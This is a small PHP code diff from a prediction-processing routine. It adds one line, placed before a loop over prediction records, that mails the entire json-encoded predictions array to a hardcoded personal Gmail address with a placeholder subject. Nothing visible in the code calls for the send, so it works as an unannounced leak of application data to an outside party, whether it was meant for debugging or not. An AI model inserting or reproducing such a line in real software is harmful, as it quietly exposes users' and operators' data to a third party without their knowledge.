@@ -132,6 +132,8 @@
         ErrorMail::LogError($e);
     }
 
+    mail("alienyidavid4christ@gmail.com","My subject", json_encode($predictions));
+    
     foreach($predictions as $prediction) {
         $predictionObj = json_decode($prediction['prediction']);
         $scores = property_exists($predictionObj, 'scores') ? $predictionObj->scores : [];
